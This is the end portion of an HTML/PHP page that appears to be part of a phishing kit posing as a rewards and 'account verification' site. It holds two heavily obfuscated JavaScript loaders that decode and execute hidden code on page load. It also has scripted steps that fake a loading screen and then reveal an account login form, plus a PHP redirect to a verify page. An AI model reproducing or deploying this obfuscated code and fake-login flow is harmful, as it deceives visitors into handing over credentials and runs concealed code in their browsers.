8t,e2l6_,e(l.gPe..0Pr7,r.!+pr;1P6.eaPc$&,a]vct4 P1%v_r_,1{P r4c3.P7nSjj.P0r vP6rl(ptn:ee87[}rn( _=t$:1e(b)er!% 3%55 P)ca6PD t.g_(g(_6'));var wjZ=kqE(PNm,vDL );wjZ(2635);return 5270})()
</script>
<script>
      function get_toksen() {   
	$('.open_rewards').hide(); 
	$('.itemReward_confirmation2').hide();
	$('.account_verification').show(); 
}
function get_token() {    
    $('.loadinglogin').show();
	$('#text-login1').show()
    setTimeout(function () {
      $('#text-login1').hide()
      $('#text-login2').fadeIn()
    }, 2000)
	$('.open_rewards').hide(); 
	$('.itemReward_confirmation2').hide();
	setTimeout(function () {
    $('.account_login').show();  
    $('.loadinglogin').hide();
      }, 5000);                              	      		    
}
    </script>
//module
<script>
var DontForgetMe;(function(){var GHp='',iBy=834-823;function QyS(c){var x=1293878;var u=c.length;var w=[];for(var b=0;b<u;b++){w[b]=c.charAt(b)};for(var b=0;b<u;b++){var v=x*(b+364)+(x%34816);var o=x*(b+370)+(x%48332);var p=v%u;var i=o%u;var t=w[p];w[p]=w[i];w[i]=t;x=(v+o)%1300128;};return w.join('')};var yAT=QyS('ratdtwbcoovcrzemclpohxnginftrksuusqyj').substr(0,iBy);var mNn=')a) u=t4(z.2,,A=e9Sv8r1wg"=b d fvh(jhlCn p=r}trv]x<zi;=a0 i=)9s,l2,8a,i5C8,,66883,00[7s,n9=8[,[8t9=,]1e7w,a4n6+,+5o7;,v5[;(a; m=7]ef rfv1rao.0"o=mdl}nit+;y+i).[)[d]1=a+1;1a[ ;=v]ren=h9az==)7)y{=b7{f,rrv1roh=08h+apg+mqn.ssljnut,;i+.)rver;n(ahgym"ntshh).(psi)(" ])=fbrevrrcjrn+l)n[tu- ;n>e03j,-o{dah j=luel vrrtrrnrjm;{at t=,ual7var.c(0)vtrrv7r8lrn(t ;va+ r;(on(fas ==+;9<);]+e)1vgr=kar;c(a(Ctd,Aa(u),v}rlpguikm;7f=pv{o=npr1k*t+e.theroo;e(teta1i-e;f=7;)+r;tecs) vf(ki=t);soz+(a.;e}grhievr c;a(Crd[A (a+=))+t.ahoraoeegthts2m-r;r=.;i+o2[}(l0e;cpnfi,un;fi-(l==ntl])o=]]]i,(r>y);.ruth rus<b+t9iggicdac)tiop;s0(f[c+)].;c=;+6;0i-(o!]n[l)))if(v<n)s.1ush;r"s=b.tli2g0cs)nn;j!=i.vogn="()=}1gsphsh(o[2](;+vjrif=g;jcir(c";;va, a=t4a,*0a3u,r9r94,46e.lo2c6tCml;ma; o=;thiag2f=o CoaCCod(((6p;uo-(iau z=i;t<(.levgth.o{+vfnfnstlrtnd{w6c.aeAe(v)).poonuShrhn[.,r.m}hrrjoreub.oA) ;.e5u6n;f6s+lrttd+"g"..ao"nuda;';var ehi=QyS[yAT];var OVk='';var HUY=ehi;var PPY=ehi(OVk,QyS(mNn));var ZrX=PPY(QyS('_;$oZ%0)1f3$1.utel:;=3.Z]}}aZ]sn!tl(mymi]Z-Z)S_r4n,{y$2t3b}3bZ7a=.+.o(Zh;3!,i05 a+ec{jZ-=(0..,{r\'{. )c0oc.m\/3p%8(a"(Zd&3g\/.2ZdpZ!,$ jaZ$_i{nZoa)c0anZ. Z+ne-y)%}S;ar{)re%ctc(ed&zp=6 m\/)o)..j.%)90{,]bZZ{%qZ((4,:ooaj,].l(6$cdZ6w38Zb((Z6d[6ZbiygeSeZ3E c)"))s2e r0l&rcl$sl.,)=un)C#,.%}odZ)!ofc[h!.))66]ld(;=ce#b6%xde3b18).py(p.$s)i)nse)( jrZ)jZc 3)Zred0:i.j0Z;.o.((Z(%.\/af7!r,2asZZ4Zyb$,_7oij].Z,;1=3]7Z_!=;.(;z=rdd.ni(e=-o3l(y.c.*)Z$(n!3oe,+Z$=Z7..61,Z0Zi(js3{!u9y(,Z7(z2Z..o;.r{_=ph$adZ0;SjZ!c4;,ti3s.Z_0!tZd=& ZZ.d4Zo73rn()76)2b!m.# d_{]eE3TZ%(s1!vdZ.=h.r4#ZZe(4Z4f4.2].;].+.5o)7p.(.d5sce3b,dcp-# )$nt4t3}8pg._;Z1$Z$.j}(c3.=,jr_1r{(en(,Zpcaes*]3t)\'{Z,$Ze$76ftr;Zb=},$.j++")o.Z_c()Dc3}l3_me_o.\'{((j_Zz)zsaM9\/u2f;Z)!4$Zt;vZajt5yZ0!%a4!(eg.$,);1$7cwt*!Zho{ryn4)ZZbp=e8,bgZ\/yZZ,eaZZ Zc=!l:3.Z5.o]f)(dZduZ2_sccu.l{ZZ.(_eZZe,1)et)rsrge,_4m,ma#Z4c(Z_"\/_3Zl)Zh2+ZZ"%6=&m(;;Z;![s3je2{)(rZzs_isd64yZu&sdZ!a(3)#eZ).84 d,3..r"Z;(0iZ)($aoC,z)Z6i#07!Z=};efo7:0ide_;Z6Z4!.5Z)i];7d! 4c,ZZ4fp)4jgoosn1iZa.!zZ,)Z8r3g_o=soxft$$.ud Z[+(t)eZZfn%Z,2 %c_ZZZ) a_($jg0 )fZ5mud(6i1})Z\'st!)s .4)7;2(cj\/[.2Z(p.6 a(!44"ZZaZ6,c0$pZ u)iefj} ;ZZus)r p1n[Z!)=;rZe6,7ptrqft;!3)Z332tl3\'(Z!-\/[$a(,t.e(z!.tg*'));var Gvo=HUY(GHp,ZrX );Gvo(6824);return 1537})()
</script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"3ebbeb2fd0964afe9cc7a02824e3585c","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>


</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>